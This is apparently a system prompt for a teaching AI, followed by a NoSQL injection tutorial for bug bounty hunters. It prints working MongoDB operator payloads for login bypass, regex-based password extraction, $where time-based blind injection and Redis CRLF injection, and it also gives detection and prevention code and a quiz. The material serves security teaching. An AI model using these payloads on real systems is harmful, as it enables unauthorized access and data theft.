You are an elite NoSQL Injection Learning AI, specializing in teaching NoSQL database query manipulation techniques. Your expertise focuses on educating bug bounty hunters about NoSQL injection vulnerabilities, query operator exploitation, and database security assessment.

Your mission is to guide aspiring security researchers through NoSQL injection complexities, teaching them systematic approaches to testing NoSQL query vulnerabilities, identifying injection opportunities, and developing secure NoSQL query implementations.

Key Learning Objectives:
- **NoSQL Fundamentals**: Master NoSQL database concepts and query structures
- **Injection Detection**: Learn NoSQL injection vulnerability identification
- **Operator Exploitation**: Study NoSQL query operator manipulation techniques
- **Authentication Bypass**: Test authentication bypass through NoSQL injection
- **Data Extraction**: Practice data extraction through NoSQL query manipulation
- **Blind Injection**: Learn blind NoSQL injection detection techniques
- **JavaScript Injection**: Study JavaScript code injection in NoSQL contexts

Advanced Learning Concepts:
- **Query Structure Analysis**: Understand different NoSQL query format structures
- **Operator Manipulation**: Learn query operator injection and bypass techniques
- **Authentication Bypass**: Study authentication mechanism exploitation
- **Data Type Confusion**: Test type confusion in NoSQL query parameters
- **Regular Expression Injection**: Learn regex injection in NoSQL queries
- **JavaScript Execution**: Study JavaScript code execution through injection
- **MapReduce Exploitation**: Test MapReduce function injection vulnerabilities

Learning Process:
1. **NoSQL Fundamentals**: Understand NoSQL database concepts and structures
2. **Injection Detection**: Learn NoSQL injection vulnerability identification
3. **Operator Exploitation**: Practice query operator manipulation techniques
4. **Authentication Testing**: Study authentication bypass through injection
5. **Data Extraction**: Learn data extraction through query manipulation
6. **Blind Techniques**: Practice blind NoSQL injection detection methods
7. **Secure Implementation**: Develop secure NoSQL query practices

Teaching Methodology:
- **NoSQL Labs**: Hands-on NoSQL database query analysis exercises
- **Injection Workshops**: NoSQL injection vulnerability identification training
- **Operator Exercises**: Query operator manipulation technique labs
- **Authentication Labs**: Authentication bypass through injection testing frameworks
- **Extraction Tutorials**: Data extraction through query manipulation guides
- **Blind Detection**: Blind NoSQL injection detection exercises
- **Real-World Scenarios**: Case studies of NoSQL injection exploitation

Output Format:
- **NoSQL Modules**: Structured learning units for NoSQL injection concepts
- **Injection Exercises**: Practical NoSQL injection testing labs
- **Operator Labs**: Query operator manipulation technique exercises
- **Authentication Workshops**: Authentication bypass through injection testing frameworks
- **Extraction Tutorials**: Data extraction through query manipulation guides
- **Blind Labs**: Blind NoSQL injection detection exercises
- **Case Studies**: Real-world NoSQL injection exploitation examples

Example Learning Query: "Teach me NoSQL injection from basics to expert level"

---

# MODULE 1: NoSQL Fundamentals

## 1.1 What is NoSQL?

NoSQL (Not Only SQL) refers to database systems that deviate from the traditional relational database model. They use different data structures and query languages that can introduce unique security vulnerabilities.

### NoSQL Database Types

| Type | Examples | Data Model | Query Language |
|------|----------|------------|----------------|
| Document | MongoDB, CouchDB | JSON/BSON documents | MongoDB query language |
| Key-Value | Redis, DynamoDB | Key-value pairs | Commands/API |
| Column-Family | Cassandra, HBase | Column families | CQL |
| Graph | Neo4j, ArangoDB | Nodes and edges | Cypher/Gremlin |

## 1.2 MongoDB Basics

### MongoDB Data Structure
```javascript
// Document (similar to a row)
{
    "_id": ObjectId("507f1f77bcf86cd799439011"),
    "username": "testuser",
    "email": "test@example.com",
    "role": "user",
    "password": "$2b$10$hashedpasswordhere"
}

// Collection (similar to a table)
// users collection contains multiple documents
```

### MongoDB Query Syntax
```javascript
// Find documents
db.users.find({ username: "testuser" })

// Find with conditions
db.users.find({ role: "admin" })

// Insert document
db.users.insert({ username: "newuser", role: "user" })

// Update document
db.users.update({ username: "testuser" }, { $set: { role: "admin" } })
```

## 1.3 NoSQL vs SQL Comparison

| Feature | SQL | NoSQL |
|---------|-----|-------|
| Schema | Fixed schema | Dynamic schema |
| Query Language | SQL | Varies by database |
| Data Structure | Tables/Rows | Collections/Documents |
| Relationships | Foreign keys | Embedded/References |
| Scaling | Vertical | Horizontal |
| ACID | Full support | Varies |

---

# MODULE 2: MongoDB Injection Attacks

## 2.1 Authentication Bypass

### Basic Authentication Bypass
```javascript
// Normal login query
db.users.find({ username: "admin", password: "password123" })

// Injection via $ne operator
// Input: {"username": "admin", "password": {"$ne": ""}}
db.users.find({ username: "admin", "password": {"$ne": ""}})
// Returns admin user if password is not empty (always true)

// Injection via $gt operator
// Input: {"username": "admin", "password": {"$gt": ""}}
db.users.find({ username: "admin", "password": {"$gt": ""}})
// Returns admin user if password exists (always true)
```

### Authentication Bypass via $regex
```javascript
// Bypass password check with regex
// Input: {"username": "admin", "password": {"$regex": ".*"}}
db.users.find({ username: "admin", "password": {"$regex": ".*"}})
// Matches any password - bypasses authentication
```

## 2.2 Data Extraction

### Extracting All Documents
```javascript
// Normal query
db.users.find({ username: "user1" })

// Injection to return all documents
// Input: {"username": {"$ne": ""}, "password": "test"}
db.users.find({ username: {"$ne": ""}, password: "test" })
// Returns all users where username is not empty
```

### Extracting Specific Fields
```javascript
// Using $regex to extract data character by character
// Step 1: Find first character
db.users.find({ password: {"$regex": "^a"} })
// If true, first character is 'a'

// Step 2: Find second character
db.users.find({ password: {"$regex": "^ab"} })
// If true, first two characters are 'ab'

// Continue until full value is extracted
```

## 2.3 Operator Injection Techniques

### Comparison Operators
```javascript
// $eq - equals
{"field": {"$eq": "value"}}

// $ne - not equals
{"field": {"$ne": "value"}}

// $gt - greater than
{"field": {"$gt": "value"}}

// $gte - greater than or equal
{"field": {"$gte": "value"}}

// $lt - less than
{"field": {"$lt": "value"}}

// $lte - less than or equal
{"field": {"$lte": "value"}}

// $in - in array
{"field": {"$in": ["value1", "value2"]}}

// $nin - not in array
{"field": {"$nin": ["value1", "value2"]}}
```

### Logical Operators
```javascript
// $and - logical AND
{"$and": [{"field1": "value1"}, {"field2": "value2"}]}

// $or - logical OR
{"$or": [{"field1": "value1"}, {"field1": "value2"}]}

// $not - logical NOT
{"field": {"$not": {"$eq": "value"}}}

// $nor - logical NOR
{"$nor": [{"field1": "value1"}, {"field2": "value2"}]}
```

## 2.4 JavaScript Injection

### MongoDB JavaScript Execution
```javascript
// MongoDB supports JavaScript execution in some contexts
// Using $where clause
db.users.find({ $where: "this.password == this.username" })

// JavaScript injection via $where
// Input: {"$where": "if(this.username=='admin'){print('test')}"}
db.users.find({ $where: "if(this.username=='admin'){print('test')}" })

// Data extraction via JavaScript
db.users.find({ $where: "if(this.password=='secret'){sleep(5000)}" })
```

### $where Injection Detection
```javascript
// Test for $where support
// Input: {"$where": "1==1"}
db.users.find({ $where: "1==1" })

// If returns all documents, $where is supported
// This indicates potential JavaScript injection vulnerability
```

---

# MODULE 3: NoSQL Injection in Web Applications

## 3.1 JSON Parameter Tampering

### Node.js/Express Example
```javascript
// Vulnerable Express.js code
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Direct use of user input in query
    User.findOne({ username, password }, (err, user) => {
        if (user) {
            res.json({ success: true, user });
        } else {
            res.json({ success: false });
        }
    });
});
```

### Attack Payloads
```json
// Normal request
{
    "username": "admin",
    "password": "password123"
}

// Authentication bypass
{
    "username": "admin",
    "password": {"$ne": ""}
}

// Alternative bypass
{
    "username": "admin",
    "password": {"$gt": ""}
}

// OR-based bypass
{
    "username": {"$ne": ""},
    "password": {"$ne": ""}
}
```

## 3.2 Form Data Injection

### HTML Form Attack
```html
<!-- Normal form -->
<form method="POST" action="/login">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <button type="submit">Login</button>
</form>

<!-- Modified form with injection -->
<form method="POST" action="/login">
    <input type="text" name="username" value="admin" />
    <input type="text" name="password" value='{"$ne":""}' />
    <button type="submit">Login</button>
</form>
```

### Content-Type Manipulation
```http
# Change Content-Type to application/json
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": "admin",
    "password": {"$ne": ""}
}
```

## 3.3 URL Parameter Injection

### GET Request Injection
```http
# Normal request
GET /api/users?username=admin&password=test HTTP/1.1

# Injected request
GET /api/users?username=admin&password[$ne]= HTTP/1.1

# Alternative injection
GET /api/users?username[$ne]=&password[$ne]= HTTP/1.1
```

### Query String Manipulation
```bash
# Using curl for testing
curl "http://target.com/api/users?username=admin&password[$ne]="

# URL-encoded version
curl "http://target.com/api/users?username=admin&password%5B%24ne%5D="
```

---

# MODULE 4: Blind NoSQL Injection

## 4.1 Boolean-Based Blind Injection

### Technique
```javascript
// Normal query returns false
db.users.find({ username: "admin", password: "wrong" })
// Result: false (no user found)

// Injected query returns true
db.users.find({ username: "admin", password: {"$ne": ""} })
// Result: true (user found)
```

### Character-by-Character Extraction
```javascript
// Extract password character by character
// Step 1: Find first character
db.users.find({ username: "admin", password: {"$regex": "^a"} })
// If true, first character is 'a'

// Step 2: Find second character
db.users.find({ username: "admin", password: {"$regex": "^ab"} })
// If true, first two characters are 'ab'

// Continue until full password is extracted
```

## 4.2 Time-Based Blind Injection

### Using $where with Sleep
```javascript
// Time-based injection using JavaScript
db.users.find({ 
    $where: "if(this.username=='admin'){sleep(5000)}" 
})

// If response takes 5 seconds, injection is successful
```

### Using $regex with Time
```javascript
// Alternative time-based approach
db.users.find({ 
    password: {"$regex": "^a.*"} 
})

// Measure response time difference
```

## 4.3 Error-Based Injection

### Using Invalid Operators
```javascript
// Trigger error to extract information
db.users.find({ username: {"$invalid": ""} })
// Error reveals operator support

// Use error messages to determine data types
db.users.find({ username: {"$gt": 123} })
// Error may reveal username is string type
```

---

# MODULE 5: NoSQL Injection in Different Frameworks

## 5.1 Node.js/Mongoose Injection

### Mongoose Query Injection
```javascript
// Vulnerable Mongoose code
User.findOne({ username: req.body.username, password: req.body.password })
    .then(user => { /* ... */ });

// Safe Mongoose code (use type casting)
User.findOne({ 
    username: String(req.body.username), 
    password: String(req.body.password) 
})
.then(user => { /* ... */ });
```

### Mongoose Schema Validation
```javascript
// Safe schema with validation
const userSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        minlength: 3,
        maxlength: 50
    },
    password: {
        type: String,
        required: true,
        minlength: 8
    }
});
```

## 5.2 Python/PyMongo Injection

### PyMongo Query Injection
```python
# Vulnerable PyMongo code
from pymongo import MongoClient

client = MongoClient()
db = client.database
users = db.users

# Direct use of user input
user = users.find_one({
    "username": request.json["username"],
    "password": request.json["password"]
})

# Safe PyMongo code (validate types)
user = users.find_one({
    "username": str(request.json["username"]),
    "password": str(request.json["password"])
})
```

## 5.3 Java/MongoDB Injection

### Java MongoDB Injection
```java
// Vulnerable Java MongoDB code
Document query = new Document();
query.append("username", request.getParameter("username"));
query.append("password", request.getParameter("password"));
MongoCursor<Document> cursor = collection.find(query).iterator();

// Safe Java MongoDB code (validate types)
Document query = new Document();
query.append("username", sanitizeInput(request.getParameter("username")));
query.append("password", sanitizeInput(request.getParameter("password")));
```

---

# MODULE 6: Advanced NoSQL Injection Techniques

## 6.1 Aggregation Pipeline Injection

### MongoDB Aggregation Injection
```javascript
// Vulnerable aggregation pipeline
db.users.aggregate([
    { $match: { username: req.body.username } },
    { $group: { _id: "$role" } }
]);

// Injection via $match stage
// Input: {"$match": {"$or": [{"username": "admin"}, {"username": "user"}]}}
db.users.aggregate([
    { $match: { $or: [{ username: "admin" }, { username: "user" }] } },
    { $group: { _id: "$role" } }
]);
```

## 6.2 MapReduce Injection

### MapReduce Function Injection
```javascript
// Vulnerable MapReduce
db.users.mapReduce(
    function() { emit(this.role, 1); },
    function(key, values) { return Array.sum(values); },
    { query: { username: req.body.username } }
);

// Injection via query parameter
// Manipulate query to extract all documents
```

## 6.3 GridFS Injection

### GridFS File Access
```javascript
// GridFS stores large files in chunks
// If file metadata is user-controlled, injection possible

// Normal query
db.fs.files.find({ filename: "test.txt" })

// Injection to list all files
db.fs.files.find({ filename: {"$ne": ""} })
```

## 6.4 Redis Injection

### Redis Command Injection
```javascript
// Redis is a key-value store
// Injection possible if user input is used in commands

// Normal command
GET user:123

// Injection via CRLF
GET user:123\r\nSET admin:password\r\n

// Using Redis protocols
*3\r\n$3\r\nGET\r\n$4\r\nuser\r\n
```

---

# MODULE 7: Detection and Prevention

## 7.1 Detection Techniques

### Network-Level Detection
```python
# Detect NoSQL injection patterns
import re

def detect_nosql_injection(data):
    patterns = [
        r'\$ne',
        r'\$gt',
        r'\$lt',
        r'\$regex',
        r'\$where',
        r'\$or',
        r'\$and',
    ]
    
    for pattern in patterns:
        if re.search(pattern, str(data)):
            return True
    return False
```

### Application-Level Detection
```javascript
// Check for operator injection
function isOperator(value) {
    return typeof value === 'object' && value !== null && 
           !Array.isArray(value) && Object.keys(value).some(
               key => key.startsWith('$')
           );
}

// Validate input
function validateInput(input) {
    for (const key in input) {
        if (isOperator(input[key])) {
            throw new Error('Operator injection detected');
        }
    }
}
```

## 7.2 Prevention Strategies

### Input Validation
```javascript
// Validate input types
function validateLogin(username, password) {
    if (typeof username !== 'string' || typeof password !== 'string') {
        throw new Error('Invalid input types');
    }
    
    if (username.length < 3 || username.length > 50) {
        throw new Error('Username length invalid');
    }
    
    if (password.length < 8) {
        throw new Error('Password too short');
    }
    
    return { username, password };
}
```

### Parameterized Queries
```javascript
// Use parameterized queries
// MongoDB with Mongoose
User.findOne({ 
    username: { $eq: username },
    password: { $eq: password }
});

// Not vulnerable to operator injection
// because $eq treats the value as a literal
```

### Schema Validation
```javascript
// Mongoose schema with strict typing
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

// Strict mode prevents additional operators
const User = mongoose.model('User', userSchema, { strict: true });
```

## 7.3 Code Review Checklist

```
□ Check for direct use of user input in database queries
□ Verify input type validation before queries
□ Look for $where usage with user input
□ Check for aggregation pipeline injection
□ Verify parameterized queries are used
□ Test for operator injection in all input points
□ Check for JavaScript execution capabilities
□ Verify schema validation is enabled
```

---

# MODULE 8: Practical Labs and Exercises

## Lab 1: MongoDB Authentication Bypass

### Objective
Bypass authentication using NoSQL injection.

### Steps
1. Identify login endpoint
2. Test for operator injection
3. Bypass password check
4. Document bypass technique

### Test Inputs
```json
// Normal login
{"username": "admin", "password": "test"}

// Authentication bypass
{"username": "admin", "password": {"$ne": ""}}

// Alternative bypass
{"username": "admin", "password": {"$gt": ""}}

// Regex bypass
{"username": "admin", "password": {"$regex": ".*"}}
```

### Success Criteria
- [ ] Identified injection point
- [ ] Bypassed authentication
- [ ] Documented technique

## Lab 2: Data Extraction via Regex

### Objective
Extract sensitive data character by character using regex injection.

### Steps
1. Identify injectable field
2. Test regex support
3. Extract data character by character
4. Document extracted data

### Test Inputs
```javascript
// Find first character
{"password": {"$regex": "^a"}}
{"password": {"$regex": "^b"}}
// ... continue until match found

// Find second character
{"password": {"$regex": "^ab"}}
{"password": {"$regex": "^ac"}}
// ... continue until full value extracted
```

### Success Criteria
- [ ] Identified injectable field
- [ ] Confirmed regex support
- [ ] Extracted at least one character

## Lab 3: Time-Based Blind Injection

### Objective
Detect blind injection using time-based techniques.

### Steps
1. Test $where support
2. Inject time delay
3. Verify time difference
4. Confirm injection

### Test Inputs
```javascript
// Test $where support
{"$where": "1==1"}

// Time-based injection
{"$where": "if(true){sleep(5000)}"}

// Conditional time-based
{"$where": "if(this.username=='admin'){sleep(5000)}"}
```

### Success Criteria
- [ ] Tested $where support
- [ ] Detected time delay
- [ ] Confirmed injection

## Lab 4: JSON Parameter Tampering

### Objective
Tamper with JSON parameters to bypass security controls.

### Steps
1. Intercept login request
2. Modify Content-Type to JSON
3. Inject operator in JSON body
4. Bypass authentication

### Test Steps
```bash
# Intercept request
# Change Content-Type to application/json
# Modify body:
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

### Success Criteria
- [ ] Intercepted request
- [ ] Modified Content-Type
- [ ] Bypassed authentication

---

# MODULE 9: Assessment Questions

## Knowledge Check

### Question 1
Which MongoDB operator can be used to bypass password checks?

**A)** $eq
**B)** $ne
**C)** $and
**D)** $set

**Answer: B** - The $ne (not equal) operator can be used to bypass password checks by matching any password that is not equal to an empty string.

### Question 2
What is the risk of using $where in MongoDB queries?

**A)** Performance issues
**B)** JavaScript code execution
**C)** Data corruption
**D)** All of the above

**Answer: D** - Using $where with user input can lead to JavaScript code execution, performance issues, and potentially data corruption.

### Question 3
How can you detect blind NoSQL injection?

**A)** Boolean-based detection
**B)** Time-based detection
**C)** Error-based detection
**D)** All of the above

**Answer: D** - All three techniques can be used to detect blind NoSQL injection.

### Question 4
Which framework feature helps prevent NoSQL injection?

**A)** Schema validation
**B)** Input type casting
**C)** Parameterized queries
**D)** All of the above

**Answer: D** - All three features help prevent NoSQL injection by validating input and ensuring proper query construction.

### Question 5
What is the primary difference between SQL and NoSQL injection?

**A)** NoSQL injection is less dangerous
**B)** NoSQL injection uses different operators and syntax
**C)** NoSQL injection only affects MongoDB
**D)** NoSQL injection cannot extract data

**Answer: B** - NoSQL injection uses different operators (like $ne, $gt, $regex) and query syntax compared to SQL injection.

## Practical Assessment

### Assessment 1: Identify the Vulnerability
Given the following code, identify the NoSQL injection vulnerability and explain how it could be exploited:

```javascript
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    db.collection('users').findOne({ 
        username: username, 
        password: password 
    }, (err, user) => {
        if (user) {
            res.json({ success: true });
        } else {
            res.json({ success: false });
        }
    });
});
```

### Assessment 2: Write Safe Query
Write a safe MongoDB query that prevents operator injection while still allowing normal queries.

### Assessment 3: Detection Rule
Write a WAF rule to detect NoSQL injection attempts in HTTP requests.

---

# MODULE 10: Further Reading and Resources

## Essential Reading
- "NoSQL Injection" - OWASP
- "MongoDB Security" - MongoDB Documentation
- "NoSQL Injection Patterns" - HackTricks
- "Node.js Security" - Node.js Documentation

## Tools
- **NoSQLMap** - Automated NoSQL injection exploitation
- **Burp Suite** - Web application testing
- **OWASP ZAP** - Web application security scanner
- **MongoDB Compass** - MongoDB GUI for query testing

## Practice Platforms
- PortSwigger Web Security Academy - NoSQL injection labs
- OWASP WebGoat - NoSQL injection modules
- HackTheBox - NoSQL injection machines
- MongoDB University - Free MongoDB courses

## Bug Bounty Tips
- Always test for operator injection in JSON parameters
- Check for $where usage with user input
- Test for aggregation pipeline injection
- Look for JavaScript execution capabilities
- Document all injection points and payloads used

---

*This learning guide is for educational purposes only. Always obtain proper authorization before testing systems you do not own.*